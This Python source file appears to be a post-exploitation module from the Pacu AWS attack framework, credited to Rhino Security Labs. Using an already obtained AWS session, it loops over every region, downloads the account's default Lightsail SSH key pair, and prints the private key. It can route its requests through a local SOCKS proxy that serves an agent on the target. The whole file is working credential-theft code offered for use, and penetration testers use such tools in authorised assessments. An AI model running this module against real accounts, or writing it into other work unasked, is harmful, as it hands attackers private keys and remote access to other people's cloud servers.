#!/usr/bin/env python3
import argparse
import boto3
import botocore
import json


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'download_lightsail_ssh_keys',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'post_exploitation',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Downloads Lightsails default SSH key pairs.',

    # Description about what the module does and how it works
    'description': 'This module downloads the accounts default public and private SSH keys for AWS Lightsail.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['Lightsail'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': [],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': [],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])


def help():
    return [module_info, parser.format_help()]


def main(args, pacu_main):
    session = pacu_main.get_active_session()
    proxy_settings = pacu_main.get_proxy_settings()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    get_regions = pacu_main.get_regions
    ######

    regions = get_regions('lightsail')

    for region in regions:
        client = boto3.client(
            'lightsail',
            region_name=region,
            aws_access_key_id=session.access_key_id,
            aws_secret_access_key=session.secret_access_key,
            aws_session_token=session.session_token,
            config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
        )
        downloaded_keys = client.download_default_key_pair()
        restructured_keys = {
            'publicKey': downloaded_keys['publicKeyBase64'],
            'privateKey': downloaded_keys['privateKeyBase64']
        }
        print(f'Region: {region}\n{json.dumps(restructured_keys)}\n')

    print(f"{module_info['name']} completed.\n")
    return
